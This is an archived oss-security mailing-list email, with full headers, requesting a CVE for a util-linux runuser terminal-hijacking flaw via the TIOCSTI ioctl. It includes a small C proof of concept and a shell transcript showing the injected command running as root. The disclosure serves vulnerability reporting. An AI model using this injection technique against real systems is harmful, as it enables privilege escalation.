X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1111" "Friday" "26" "February" "2016" "15:54:16" "+0100" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20160226155416.82785yodpagwmigw@webmail.alunos.dcc.fc.up.pt>" "42" "[oss-security] CVE Request: util-linux runuser tty hijacking via TIOCSTI ioctl" nil nil nil "2" "2016022614:54:16" "[oss-security] CVE Request: util-linux runuser tty hijacking via TIOCSTI ioctl" (number mark "U       up201407890@ Feb 26   42/1111  " thread-indent "\"[oss-security] CVE Request: util-linux runuser tty hijacking via TIOCSTI ioctl\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 10157 invoked by uid 550); 27 Feb 2016 06:38:49 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9563 invoked from network); 27 Feb 2016 06:37:05 -0000
Message-ID: <20160226155416.82785yodpagwmigw@webmail.alunos.dcc.fc.up.pt>
Date: Fri, 26 Feb 2016 15:54:16 +0100
From: up201407890@alunos.dcc.fc.up.pt
To: oss-security@lists.openwall.com
Cc: cve-assign@mitre.org
MIME-Version: 1.0
Content-Type: text/plain;
	charset=ISO-8859-1;
	DelSp="Yes";
	format="flowed"
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
User-Agent: Internet Messaging Program (IMP) H3 (4.2)
X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
Subject: [oss-security] CVE Request: util-linux runuser tty hijacking via TIOCSTI ioctl

This is a similar issue to the one I posted yesterday on oss-sec, but=20=20
to runuser(1) from util-linux, which can only be run as root for the=20=20
purpose of executing programs as another user.

https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=3D815922

When executing a program via "runuser -u nonpriv program" the
nonpriv session can
escape to the parent session by using the TIOCSTI ioctl to push
characters into the
terminal's input buffer, allowing privilege escalation.
This issue has been fixed in "su" by calling setsid() and in "sudo" by
using the "use_pty" flag

# cat test.c
#include <sys/ioctl.h>

int main()
{
char *cmd =3D "id\n";
while(*cmd)
ioctl(0, TIOCSTI, cmd++);
}

# gcc test.c -o test
# id saken
uid=3D1000(saken) gid=3D1000(saken) groups=3D1000(saken)

# runuser -u saken ./test ---> last command i type in
id
# id ---> did not type this
uid=3D0(root) gid=3D0(root) groups=3D0(root)


I'd like to request a CVE for this issue.

Thanks,
Federico Bento

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

